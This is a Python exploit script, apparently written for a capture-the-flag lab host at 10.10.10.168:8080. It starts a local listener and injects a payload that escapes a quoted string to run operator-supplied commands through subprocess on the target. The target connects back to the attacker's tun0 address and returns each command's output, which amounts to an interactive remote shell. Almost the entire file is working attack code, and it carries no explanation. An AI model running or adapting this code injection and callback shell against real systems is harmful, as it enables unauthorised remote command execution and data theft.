import socket, os, sys, threading, readline
if len(sys.argv)<2:
    print("Too few arguments.")
    print("Usage : exploit.py <tun0>")
    exit()
payload1 = "a ';s=socket.socket();s.connect(('{}',{}));s.sendall(subprocess.check_output({}));' a\na" # Payload
PORT = None
def AcceptConn():
    global conn, PORT
    sockbind = socket.socket()
    sockbind.bind(("0.0.0.0", 0))
    sockbind.listen(2)
    PORT = sockbind.getsockname()[1]
    while 1:
        conn, addr = sockbind.accept()
threading.Thread(target=AcceptConn).start()
while 1:
    command = input("Cmd >> ")
    sockpay = socket.socket()
    sockpay.connect(("10.10.10.168", 8080))
    sockpay.sendall(payload1.format(sys.argv[1],PORT,''.join(str(command.split(" ")).split(" "))).encode())
    sockpay.close(); del sockpay
    while True:
        try:
            data = conn.recv(2000).decode()
            while not data:
                data = conn.recv(2000).decode()
            print(data)
            conn.close(); del conn
            break
        except NameError:
            pass
